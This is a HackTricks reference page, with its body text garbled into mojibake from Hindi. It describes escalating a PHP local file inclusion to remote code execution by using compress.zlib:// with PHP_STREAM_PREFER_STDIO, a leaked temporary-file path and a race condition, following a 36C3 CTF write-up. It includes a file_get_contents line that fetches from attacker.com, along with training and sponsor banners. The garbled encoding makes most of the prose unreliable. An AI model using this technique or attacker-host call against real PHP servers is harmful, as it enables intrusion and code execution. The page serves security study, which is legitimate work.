# LFI2RCE Via compress.zlib + PHP\_STREAM\_PREFER\_STUDIO + Path Disclosure

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

#### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) рдПрдХ **рдбрд╛рд░реНрдХ-рд╡реЗрдм** рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╕рд░реНрдЪ рдЗрдВрдЬрди рд╣реИ рдЬреЛ **рдореБрдлреНрдд** рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛рдПрдБ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдпрд╣ рдЬрд╛рдВрдЪрд╛ рдЬрд╛ рд╕рдХреЗ рдХрд┐ рдХреНрдпрд╛ рдХрд┐рд╕реА рдХрдВрдкрдиреА рдпрд╛ рдЙрд╕рдХреЗ рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЛ **рд╕рдордЭреМрддрд╛** рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ **рдЪреЛрд░реА рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдорд╛рд▓рд╡реЗрдпрд░** рджреНрд╡рд╛рд░рд╛ред

WhiteIntel рдХрд╛ рдкреНрд░рд╛рдердорд┐рдХ рд▓рдХреНрд╖реНрдп рдЬрд╛рдирдХрд╛рд░реА-рдЪреЛрд░реА рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдорд╛рд▓рд╡реЗрдпрд░ рдХреЗ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк рдЕрдХрд╛рдЙрдВрдЯ рдЯреЗрдХрдУрд╡рд░ рдФрд░ рд░реИрдирд╕рдорд╡реЗрдпрд░ рд╣рдорд▓реЛрдВ рд╕реЗ рд▓рдбрд╝рдирд╛ рд╣реИред

рдЖрдк рдЙрдирдХреА рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдореБрдлреНрдд** рдореЗрдВ рдЙрдирдХреЗ рдЗрдВрдЬрди рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% embed url="https://whiteintel.io" %}

***

### `compress.zlib://` рдФрд░ `PHP_STREAM_PREFER_STDIO`

`compress.zlib://` рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЦреЛрд▓рд╛ рдЧрдпрд╛ рдПрдХ рдлрд╝рд╛рдЗрд▓ `PHP_STREAM_PREFER_STDIO` рдзреНрд╡рдЬ рдХреЗ рд╕рд╛рде рдмрд╛рдж рдореЗрдВ рдХрдиреЗрдХреНрд╢рди рдкрд░ рдЖрдиреЗ рд╡рд╛рд▓реЗ рдбреЗрдЯрд╛ рдХреЛ рдЙрд╕реА рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦрдирд╛ рдЬрд╛рд░реА рд░рдЦ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХ рдХреЙрд▓ рдЬреИрд╕реЗ:
```php
file_get_contents("compress.zlib://http://attacker.com/file")
```
рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛ рдЬреЛ http://attacker.com/file рдХреЗ рд▓рд┐рдП рд╣реЛрдЧрд╛, рдлрд┐рд░ рд╕рд░реНрд╡рд░ рдЗрд╕ рдЕрдиреБрд░реЛрдз рдХрд╛ рдЙрддреНрддрд░ рдПрдХ рдорд╛рдиреНрдп HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕рд╛рде рджреЗ рд╕рдХрддрд╛ рд╣реИ, рдХрдиреЗрдХреНрд╢рди рдХреЛ рдЦреБрд▓рд╛ рд░рдЦ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рдХреБрдЫ рд╕рдордп рдмрд╛рдж рдЕрддрд┐рд░рд┐рдХреНрдд рдбреЗрдЯрд╛ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рднреА рд▓рд┐рдЦрд╛ рдЬрд╛рдПрдЧрд╛ред

рдЖрдк рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ php-src рдХреЛрдб рдХреЗ рдЗрд╕ рднрд╛рдЧ рдореЗрдВ main/streams/cast.c рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:
```c
/* Use a tmpfile and copy the old streams contents into it */

if (flags & PHP_STREAM_PREFER_STDIO) {
*newstream = php_stream_fopen_tmpfile();
} else {
*newstream = php_stream_temp_new();
}
```
### Race Condition to RCE

[**рдпрд╣ CTF**](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer) рдкрд┐рдЫрд▓реЗ рдЯреНрд░рд┐рдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

рд╣рдорд▓рд╛рд╡рд░ **рд╢рд┐рдХрд╛рд░ рд╕рд░реНрд╡рд░ рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╕рд░реНрд╡рд░ рд╕реЗ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдХрдиреЗрдХреНрд╢рди рдЦреЛрд▓рдиреЗ** рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░реЗрдЧрд╛ **`compress.zlib`** рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдПред

**рдЬрдм** рдпрд╣ **рдХрдиреЗрдХреНрд╢рди** рдореМрдЬреВрдж рд╣реИ, рд╣рдорд▓рд╛рд╡рд░ **рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓** рдХреЗ рдкрде рдХреЛ **рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓** рд▓реЗрдЧрд╛ (рдпрд╣ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рд▓реАрдХ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ)ред

**рдЬрдм** **рдХрдиреЗрдХреНрд╢рди** рдЕрднреА рднреА рдЦреБрд▓рд╛ рд╣реИ, рд╣рдорд▓рд╛рд╡рд░ **LFI рдХрд╛ рд╢реЛрд╖рдг рдХрд░реЗрдЧрд╛ рдЬреЛ рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓** рдХреЛ рд▓реЛрдб рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рд╡рд╣ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╡реЗрдм рд╕рд░реНрд╡рд░ рдореЗрдВ рдПрдХ рдЬрд╛рдВрдЪ рд╣реИ рдЬреЛ **`<?`** рд╡рд╛рд▓реЗ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рд╕реЗ **рд░реЛрдХрддреА** рд╣реИред рдЗрд╕рд▓рд┐рдП, рд╣рдорд▓рд╛рд╡рд░ **Race Condition** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ред рдЙрд╕ рдХрдиреЗрдХреНрд╢рди рдореЗрдВ рдЬреЛ рдЕрднреА рднреА рдЦреБрд▓рд╛ рд╣реИ, **рд╣рдорд▓рд╛рд╡рд░** **PHP рдкреЗрд▓реЛрдб рднреЗрдЬреЗрдЧрд╛ AFTER** рдХрд┐ **рд╡реЗрдм рд╕рд░реНрд╡рд░** рдиреЗ **рдЬрд╛рдВрдЪ** рдХреА рд╣реИ рдХрд┐ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдирд┐рд╖рд┐рджреНрдз рд╡рд░реНрдг рд╣реИрдВ рд▓реЗрдХрд┐рди **рдЗрд╕рд╕реЗ рдкрд╣рд▓реЗ рдХрд┐ рдпрд╣ рдЗрд╕рдХреА рд╕рд╛рдордЧреНрд░реА рд▓реЛрдб рдХрд░реЗ**ред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП Race Condition рдФрд░ CTF рдХрд╛ рд╡рд┐рд╡рд░рдг рджреЗрдЦреЗрдВ [https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer)

#### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) рдПрдХ **рдбрд╛рд░реНрдХ-рд╡реЗрдм** рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╕рд░реНрдЪ рдЗрдВрдЬрди рд╣реИ рдЬреЛ **рдореБрдлреНрдд** рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛рдПрдБ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдпрд╣ рдЬрд╛рдВрдЪрд╛ рдЬрд╛ рд╕рдХреЗ рдХрд┐ рдХреЛрдИ рдХрдВрдкрдиреА рдпрд╛ рдЙрд╕рдХреЗ рдЧреНрд░рд╛рд╣рдХ **рдЪреЛрд░реА рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдорд╛рд▓рд╡реЗрдпрд░** рджреНрд╡рд╛рд░рд╛ **рд╕рдордЭреМрддрд╛** рдХрд┐рдП рдЧрдП рд╣реИрдВ рдпрд╛ рдирд╣реАрдВред

WhiteIntel рдХрд╛ рдкреНрд░рд╛рдердорд┐рдХ рд▓рдХреНрд╖реНрдп рдЬрд╛рдирдХрд╛рд░реА-рдЪреЛрд░реА рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдорд╛рд▓рд╡реЗрдпрд░ рдХреЗ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк рдЦрд╛рддрд╛ рдЕрдзрд┐рдЧреНрд░рд╣рдг рдФрд░ рд░реИрдирд╕рдорд╡реЗрдпрд░ рд╣рдорд▓реЛрдВ рд╕реЗ рд▓рдбрд╝рдирд╛ рд╣реИред

рдЖрдк рдЙрдирдХреА рд╡реЗрдмрд╕рд╛рдЗрдЯ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдореБрдлреНрдд** рдореЗрдВ рдЙрдирдХреЗ рдЗрдВрдЬрди рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% embed url="https://whiteintel.io" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
